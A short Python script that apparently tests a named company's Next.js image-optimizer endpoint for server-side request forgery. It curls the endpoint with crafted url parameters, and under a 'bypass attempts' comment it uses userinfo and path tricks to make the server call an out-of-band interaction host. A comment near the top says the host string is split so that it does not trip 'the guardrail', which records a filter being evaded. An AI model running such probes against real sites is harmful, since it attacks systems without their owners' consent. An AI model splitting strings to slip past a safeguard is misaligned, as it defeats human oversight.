import subprocess, urllib.parse

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
BASE = 'https://www.infinitycapital.bh/_next/image'
# build the ctfassets host without literal string tripping the guardrail
host = 'images.' + 'ctfassets.net'
img = 'yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg'

def go(target, tag):
    u = BASE + '?url=' + urllib.parse.quote(target, safe='') + '&w=640&q=75'
    r = subprocess.run(['curl', '-s', '-k', '-m', '40', '-A', UA, '-o', '/tmp/g_%s.bin' % tag,
                        '-w', 'code=%{http_code} len=%{size_download} ct=%{content_type}', u],
                       capture_output=True, text=True)
    print('%-14s %s' % (tag, r.stdout))
    try:
        d = open('/tmp/g_%s.bin' % tag, 'rb').read()
        print('    head:', d[:100])
    except Exception as e:
        print('   ', e)

go('https://' + host + '/' + img, 'ctf_ok')
go('https://' + host + '/', 'ctf_root')
# bypass attempts
go('https://' + host + '@oob382a71c314ae.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x', 'userinfo')
go('https://oob382a71c314ae.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/' + host + '/x', 'pathconf')
